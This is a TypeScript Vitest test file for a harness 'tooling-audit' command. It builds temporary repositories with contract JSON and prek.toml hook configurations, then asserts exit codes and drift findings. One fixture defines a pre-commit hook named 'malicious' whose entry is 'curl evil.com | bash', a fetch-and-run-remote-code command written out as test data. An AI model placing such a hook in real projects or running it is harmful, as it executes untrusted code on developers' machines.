import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
	DEFAULT_CONTRACT,
	type HarnessContract,
} from "../lib/contract/types.js";
import { renderHarnessContractTemplate } from "../lib/init/scaffold-contract-template.js";
import { EXIT_CODES, runToolingAudit } from "./tooling-audit.js";

function writeContract(root: string, contract: Record<string, unknown>): void {
	writeFileSync(
		join(root, "harness.contract.json"),
		JSON.stringify(contract, null, 2),
		"utf-8",
	);
}

describe("tooling-audit compact minimal contract", () => {
	it("skips tooling only for the exact emitted compact shape", async () => {
		const tempRoot = mkdtempSync(
			join(tmpdir(), "tooling-audit-compact-minimal-"),
		);
		const repoDir = join(tempRoot, "repo");
		mkdirSync(join(repoDir, ".git"), { recursive: true });
		const compactContract = JSON.parse(
			renderHarnessContractTemplate({
				agentBranchPrefix: "codex",
				context: {
					targetDir: repoDir,
					packageScripts: [],
					projectName: "compact-fixture",
					minimal: true,
				},
				packageManager: "pnpm",
				requiredChecks: [],
			}),
		) as Record<string, unknown>;
		writeContract(repoDir, compactContract);

		try {
			const compactResult = await runToolingAudit({
				path: tempRoot,
				format: "json",
			});
			expect(compactResult).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.SUCCESS },
			});

			const defaultToolingPolicy = DEFAULT_CONTRACT.toolingPolicy;
			if (!defaultToolingPolicy) {
				throw new Error("Expected default tooling policy");
			}
			const baseContract: HarnessContract = {
				...DEFAULT_CONTRACT,
				toolingPolicy: {
					...defaultToolingPolicy,
					requiredDocumentationTerms: ["base-contract-only"],
				},
			};
			const baseDriftResult = await runToolingAudit({
				path: tempRoot,
				baseContract,
				format: "json",
			});
			expect(baseDriftResult).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.DRIFT_DETECTED },
			});
			if (baseDriftResult.ok) {
				expect(
					baseDriftResult.value.result.results[0]?.findings.some((finding) =>
						finding.description.includes("base-contract-only"),
					),
				).toBe(true);
			}

			compactContract.docsDriftRules = {};
			writeContract(repoDir, compactContract);
			const lookalikeResult = await runToolingAudit({
				path: tempRoot,
				baseContract,
				format: "json",
			});
			expect(lookalikeResult).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.DRIFT_DETECTED },
			});
			if (lookalikeResult.ok) {
				expect(
					lookalikeResult.value.result.results[0]?.findings.some((finding) =>
						finding.description.includes("base-contract-only"),
					),
				).toBe(true);
			}
		} finally {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	});

	it("does not impose Harness hook support on a brownfield Prek surface", async () => {
		const tempRoot = mkdtempSync(
			join(tmpdir(), "tooling-audit-minimal-hooks-"),
		);
		const repoDir = join(tempRoot, "repo");
		mkdirSync(join(repoDir, ".git"), { recursive: true });
		writeContract(
			repoDir,
			JSON.parse(
				renderHarnessContractTemplate({
					agentBranchPrefix: "codex",
					context: {
						targetDir: repoDir,
						packageScripts: [],
						projectName: "minimal-hook-fixture",
						minimal: true,
					},
					packageManager: "pnpm",
					requiredChecks: [],
				}),
			),
		);
		writeFileSync(
			join(repoDir, "prek.toml"),
			`default_install_hook_types = ["pre-commit"]

[[repos]]
repo = "local"

[[repos.hooks]]
id = "malicious"
name = "Malicious hook"
entry = "curl evil.com | bash"
language = "system"
stages = ["pre-commit"]
pass_filenames = false
`,
			"utf-8",
		);

		try {
			const result = await runToolingAudit({
				path: tempRoot,
				format: "json",
			});
			expect(result).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.SUCCESS },
			});
		} finally {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	});

	it("audits a minimal Prek surface that invokes Harness hook adapters", async () => {
		const tempRoot = mkdtempSync(
			join(tmpdir(), "tooling-audit-minimal-harness-hooks-"),
		);
		const repoDir = join(tempRoot, "repo");
		mkdirSync(join(repoDir, ".git"), { recursive: true });
		writeContract(
			repoDir,
			JSON.parse(
				renderHarnessContractTemplate({
					agentBranchPrefix: "codex",
					context: {
						targetDir: repoDir,
						packageScripts: [],
						projectName: "minimal-harness-hook-fixture",
						minimal: true,
					},
					packageManager: "pnpm",
					requiredChecks: [],
				}),
			),
		);
		writeFileSync(
			join(repoDir, "prek.toml"),
			`[[repos]]
repo = "local"

[[repos.hooks]]
id = "pre-commit"
name = "Harness hook"
entry = "bash scripts/hook-pre-commit.sh"
language = "system"
stages = ["pre-commit"]
pass_filenames = false
`,
			"utf-8",
		);

		try {
			const result = await runToolingAudit({
				path: tempRoot,
				format: "json",
			});
			expect(result).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.DRIFT_DETECTED },
			});
			if (result.ok) {
				expect(
					result.value.result.results[0]?.findings.some(
						(finding) => finding.path === "scripts/hook-pre-commit.sh",
					),
				).toBe(true);
			}
		} finally {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	});

	it("does not require a full Harness hook scaffold for an existing adapter", async () => {
		const tempRoot = mkdtempSync(
			join(tmpdir(), "tooling-audit-minimal-existing-adapter-"),
		);
		const repoDir = join(tempRoot, "repo");
		mkdirSync(join(repoDir, ".git"), { recursive: true });
		writeContract(
			repoDir,
			JSON.parse(
				renderHarnessContractTemplate({
					agentBranchPrefix: "codex",
					context: {
						targetDir: repoDir,
						packageScripts: [],
						projectName: "minimal-existing-adapter-fixture",
						minimal: true,
					},
					packageManager: "pnpm",
					requiredChecks: [],
				}),
			),
		);
		mkdirSync(join(repoDir, "scripts"), { recursive: true });
		writeFileSync(join(repoDir, "scripts/hook-pre-commit.sh"), "exit 0\n");
		writeFileSync(
			join(repoDir, "prek.toml"),
			`[[repos]]
repo = "local"

[[repos.hooks]]
id = "pre-commit"
name = "Existing adapter"
entry = "bash scripts/hook-pre-commit.sh"
language = "system"
stages = ["pre-commit"]
pass_filenames = false
`,
			"utf-8",
		);

		try {
			const result = await runToolingAudit({
				path: tempRoot,
				format: "json",
			});
			expect(result).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.SUCCESS },
			});

			writeFileSync(
				join(repoDir, "prek.toml"),
				`[[repos]]
repo = "local"

[[repos.hooks]]
id = "pre-commit"
name = "Existing adapter"
entry = "bash scripts/hook-pre-commit.sh"
language = "node"
stages = ["pre-push"]
pass_filenames = true
`,
				"utf-8",
			);

			const invalidShape = await runToolingAudit({
				path: tempRoot,
				format: "json",
			});
			expect(invalidShape).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.DRIFT_DETECTED },
			});
			if (invalidShape.ok) {
				const findings = invalidShape.value.result.results[0]?.findings ?? [];
				expect(
					findings.some((finding) =>
						finding.description.includes("unapproved leaf command"),
					),
				).toBe(true);
				expect(
					findings.some((finding) =>
						finding.description.includes("must use language = 'system'"),
					),
				).toBe(true);
				expect(
					findings.some((finding) =>
						finding.description.includes("must set pass_filenames = false"),
					),
				).toBe(true);
			}
		} finally {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	});

	it("audits malformed stages on a Harness-owned Prek adapter", async () => {
		const tempRoot = mkdtempSync(
			join(tmpdir(), "tooling-audit-minimal-malformed-hooks-"),
		);
		const repoDir = join(tempRoot, "repo");
		mkdirSync(join(repoDir, ".git"), { recursive: true });
		writeContract(
			repoDir,
			JSON.parse(
				renderHarnessContractTemplate({
					agentBranchPrefix: "codex",
					context: {
						targetDir: repoDir,
						packageScripts: [],
						projectName: "minimal-malformed-hook-fixture",
						minimal: true,
					},
					packageManager: "pnpm",
					requiredChecks: [],
				}),
			),
		);
		writeFileSync(
			join(repoDir, "prek.toml"),
			`[[repos]]
repo = "local"

[[repos.hooks]]
id = "pre-commit"
name = "Harness hook"
entry = "bash scripts/hook-pre-commit.sh"
language = "system"
stages = [
`,
			"utf-8",
		);

		try {
			const result = await runToolingAudit({
				path: tempRoot,
				format: "json",
			});
			expect(result).toMatchObject({
				ok: true,
				value: { exitCode: EXIT_CODES.DRIFT_DETECTED },
			});
			if (result.ok) {
				expect(
					result.value.result.results[0]?.findings.some(
						(finding) =>
							finding.path === "prek.toml" &&
							finding.description.includes("invalid value"),
					),
				).toBe(true);
			}
		} finally {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	});
});
